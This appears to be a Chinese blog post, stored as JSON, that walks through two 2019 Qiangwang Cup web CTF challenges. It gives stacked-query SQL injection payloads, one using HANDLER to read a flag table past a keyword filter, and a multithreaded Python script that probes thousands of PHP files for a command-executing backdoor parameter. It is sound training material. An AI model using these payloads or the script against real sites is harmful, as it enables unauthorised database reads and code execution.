{"title":"强网杯2019web","uid":"75154bd054299764fe262b75fa02cffa","slug":"强网杯2019web","date":"2020-09-07T03:39:44.000Z","updated":"2020-09-08T14:46:30.000Z","comments":true,"path":"api/articles/强网杯2019web.json","keywords":"A1andNS","cover":[],"content":"<p>日常刷题时间，写一下强网杯2019的web题。</p>\n<h2 id=\"0x01-随便注\"><a href=\"#0x01-随便注\" class=\"headerlink\" title=\"0x01 随便注\"></a>0x01 随便注</h2><p>上来就让你任意注入，并且在html注释里告诉你<code>sqlmap</code>没有灵魂～.～</p>\n<p>试一下加一个<code>&#39;</code>，报错啦！可以看到报错内容是’’1’’’所以基本就可以判断出查询语句中，用户输入放的位置，在<code>&#39;&#39; &#39;&#39;</code>之间。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200907114805.png\" alt=\"报错啦\"></p>\n<p>试一下<code>1&#39;/**/and/**/1=2%23</code>，可以看到没有任何查询信息。所以直接看看能不能得到列数。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200907114631.png\" alt=\"2\"></p>\n<p>使用order by来查询，可以查询到列数为2,接着试着使用union select，结果发现被过滤啦，并且返回了过滤语句。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/select|update|delete|drop|insert|where|\\./i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$inject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>可以看出它过滤啦select、update、delete、drop、insert、where、<code>.</code>，而且不区分大小写的匹配大小写绕过是没戏啦，重写也不用试了，看着语句基本就是匹配到就换回值做处理，而不是普通的把关键值置换为空。这里肯定不能在用联合查询的办法啦。上网找绕过的办法，试了一下uni&lt;&gt;on se&lt;&gt;lect 1,2的方法，可是并没有什么效果，看来要用堆叠注啦。</p>\n<p>payload:<code>-1%27;show+databases;%23</code></p>\n<p>由此可以查询到数据库名称有ctftraining、information_schema、mysql、performance_schema、supersqli、test ，这里头看起来有点意思的看你是ctftraining、supersqli以及test，先看看supersqli吧！</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200907122129.png\" alt=\"数据库名称\"></p>\n<p>payload:<code>-1%27;use+supersqli;show+tables;%23</code></p>\n<p>可以看到有两张表，一个1919810931114514开头的，一个words，看一看1919810931114514</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200907123637.png\" alt=\"表名\"></p>\n<p>payload:-1’;use+supersqli;show+columns+from+`1919810931114514`;#</p>\n<p>在列中看到啦flag列，爆它。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200907123616.png\" alt=\"列名\"></p>\n<p>payload:1’;handler `1919810931114514` open;handler `1919810931114514` read first;#</p>\n<p><img src=\"/home/a1andns/.config/Typora/typora-user-images/image-20200907130322956.png\" alt=\"image-20200907130322956\"></p>\n<p>handler语句的语法如下：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">HANDLER</span> tbl_name <span class=\"token keyword\">OPEN</span> <span class=\"token punctuation\">[</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">AS</span><span class=\"token punctuation\">]</span> alias<span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">HANDLER</span> tbl_name <span class=\"token keyword\">READ</span> index_name &#123; <span class=\"token operator\">=</span> <span class=\"token operator\">|</span> <span class=\"token operator\">&lt;=</span> <span class=\"token operator\">|</span> <span class=\"token operator\">>=</span> <span class=\"token operator\">|</span> <span class=\"token operator\">&lt;</span> <span class=\"token operator\">|</span> <span class=\"token operator\">></span> &#125; <span class=\"token punctuation\">(</span>value1<span class=\"token punctuation\">,</span>value2<span class=\"token punctuation\">,</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">[</span> <span class=\"token keyword\">WHERE</span> where_condition <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">LIMIT</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">HANDLER</span> tbl_name <span class=\"token keyword\">READ</span> index_name &#123; <span class=\"token keyword\">FIRST</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">NEXT</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">PREV</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">LAST</span> &#125;\n    <span class=\"token punctuation\">[</span> <span class=\"token keyword\">WHERE</span> where_condition <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">LIMIT</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">HANDLER</span> tbl_name <span class=\"token keyword\">READ</span> &#123; <span class=\"token keyword\">FIRST</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">NEXT</span> &#125;\n    <span class=\"token punctuation\">[</span> <span class=\"token keyword\">WHERE</span> where_condition <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">LIMIT</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">HANDLER</span> tbl_name <span class=\"token keyword\">CLOSE</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>还有一种该表名和列名的办法，但是我最终没有成功，表和列都改成了，但是直接查1没有回显内容。</p>\n<h2 id=\"0x02-高明的黑客\"><a href=\"#0x02-高明的黑客\" class=\"headerlink\" title=\"0x02 高明的黑客\"></a>0x02 高明的黑客</h2><p>一上来就提示，源码泄漏，直接下载至本地</p>\n<p>但是事情并没有这么简单，源码包里的php文件有2000多个，肯定有问题。</p>\n<p>以下是某位大佬的脚本，存一下学习一下。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">import</span> re\n<span class=\"token keyword\">import</span> threading\n<span class=\"token keyword\">import</span> time\n\nrequests<span class=\"token punctuation\">.</span>adapters<span class=\"token punctuation\">.</span>DEFAULT_RETRIES <span class=\"token operator\">=</span> <span class=\"token number\">8</span> <span class=\"token comment\">#设置重连次数，防止线程数过高，断开连接</span>\nsession <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>Session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsession<span class=\"token punctuation\">.</span>keep_alive <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span> <span class=\"token comment\"># 设置连接活跃状态为False</span>\n\nsem<span class=\"token operator\">=</span>threading<span class=\"token punctuation\">.</span>Semaphore<span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 设置最大线程数 ,别设置太大，不然还是会崩的挺厉害的，跑到关键的爆炸，心态就爆炸了</span>\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://627c82eb-be3f-47e3-900c-6f0312281861.node3.buuoj.cn/\"</span>\n\n<span class=\"token comment\"># 下载的源文件路径,根据自己的路径修改</span>\npath <span class=\"token operator\">=</span> <span class=\"token string\">r\"/home/a1andns/Downloads/src/\"</span>\n\n\nrrGET <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r\"\\$_GET\\[\\'(\\w+)\\'\\]\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#匹配get参数</span>\n\nrrPOST <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r\"\\$_POST\\[\\'(\\w+)\\'\\]\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#匹配post参数</span>\n\nfileNames <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 列出目录中的文件,以每个文件都开一个线程</span>\n\n\nlocal_file <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"w\"</span><span class=\"token punctuation\">,</span>encoding<span class=\"token operator\">=</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>fileName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t<span class=\"token keyword\">with</span> sem<span class=\"token punctuation\">:</span>\n\t\t<span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span> path <span class=\"token operator\">+</span> fileName<span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">,</span>encoding<span class=\"token operator\">=</span><span class=\"token string\">'utf-8'</span> <span class=\"token punctuation\">)</span>\n\t\tcontent <span class=\"token operator\">=</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]checking:%s\"</span> <span class=\"token operator\">%</span> fileName <span class=\"token punctuation\">)</span>\n\t\t<span class=\"token comment\">#测试get的参数</span>\n\t\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> rrGET<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t\t\tr <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span> url <span class=\"token operator\">+</span> <span class=\"token string\">\"%s?%s=%s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>fileName<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token string\">\"echo ~h3zh1~;\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token string\">\"~h3zh1~\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n\t\t\t\tflag <span class=\"token operator\">=</span> <span class=\"token string\">\"You Find it in GET fileName = %s and param = %s \\n\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span> fileName<span class=\"token punctuation\">,</span> i <span class=\"token punctuation\">)</span>\n\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n\t\t\t\tlocal_file<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token comment\">#测试post的参数</span>\n\t\t<span class=\"token comment\">#for i in rrPOST.findall(content):</span>\n\t\t<span class=\"token comment\">#\tr = session.post( url + fileName , data = &#123; i : \"echo ~h3zh1~;\" &#125; )</span>\n\t\t<span class=\"token comment\">#\tif \"~h3zh1~\" in r.text:</span>\n\t\t<span class=\"token comment\">#\t\tflag = \"You Find it in POST: fileName = %s and param = %s \\n\" % ( fileName, i )</span>\n\t\t<span class=\"token comment\">#\t\tprint(flag)</span>\n\t\t<span class=\"token comment\">#\t\tlocal_file.writelines(flag)</span>\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n\tstart_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 开始时间</span>\n\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[start]程序开始:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>start_time<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tthread_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n\t<span class=\"token keyword\">for</span> fileName <span class=\"token keyword\">in</span> fileNames<span class=\"token punctuation\">:</span>\n\t\tt <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span> target<span class=\"token operator\">=</span>run <span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>fileName<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\t\tthread_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> t <span class=\"token keyword\">in</span> thread_list<span class=\"token punctuation\">:</span>\n\t\tt<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> t <span class=\"token keyword\">in</span> thread_list<span class=\"token punctuation\">:</span>\n\t\tt<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\t\n\tend_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tlocal_file<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[end]程序结束:用时(秒):\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>end_time<span class=\"token operator\">-</span>start_time<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","text":"日常刷题时间，写一下强网杯2019的web题。 0x01 随便注上来就让你任意注入，并且在html注释里告诉你sqlmap没有灵魂～.～ 试一下加一个&#39;，报错啦！可以看到报错内容是’’1’’’所以基本就可以判断出查询语句中，用户输入放的位置，在&#39;&#39; &#3...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"CTF","slug":"CTF","count":43,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"强网杯","slug":"强网杯","count":1,"path":"api/tags/强网杯.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E9%9A%8F%E4%BE%BF%E6%B3%A8\"><span class=\"toc-text\">0x01 随便注</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2\"><span class=\"toc-text\">0x02 高明的黑客</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"DDCTF复现","uid":"638e377c432480dc1f252e376e8aa3f0","slug":"DDCTF复现","date":"2020-09-07T09:31:43.000Z","updated":"2020-09-30T04:16:18.000Z","comments":true,"path":"api/articles/DDCTF复现.json","keywords":"A1andNS","cover":[],"text":"0x01 一起拼图吗？download文件到本地上，打开后发现有6400张图片。但是图片中混淆这带有flag的图片，我们要做的就是把他们找出来。 没有脚本手找。 DDCTF{484e61cd1483c34de48eb7b3c933a22} 0x02 web签到题 题目描述：请从服...","link":"","photos":[],"count_time":{"symbolsCount":"2.3k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"DDCTF","slug":"DDCTF","count":1,"path":"api/tags/DDCTF.json"},{"name":"Misc","slug":"Misc","count":3,"path":"api/tags/Misc.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"操作系统简介","uid":"5d0069340c1ad3e5a9c0238a6c992be8","slug":"操作系统简介","date":"2020-09-06T07:22:52.000Z","updated":"2021-11-02T13:26:09.828Z","comments":true,"path":"api/articles/操作系统简介.json","keywords":"A1andNS","cover":[],"text":"学校操作系统教的好像比较迟，我先跑了。 什么是操作系统操作系统就是一类负责让程序运行变容易，允许程序共享内存，让程序能够与设备交互，以及其他类型的又去工作的软件。因为操作系统主要利用一种通用的虚拟化技术，所以我们也经常称操作系统为虚拟机，操作系统也经常实现多程序运行和通知访问自己...","link":"","photos":[],"count_time":{"symbolsCount":"1.5k","symbolsTime":"1 mins."},"categories":[{"name":"操作系统","slug":"操作系统","count":3,"path":"api/categories/操作系统.json"}],"tags":[{"name":"操作系统","slug":"操作系统","count":3,"path":"api/tags/操作系统.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}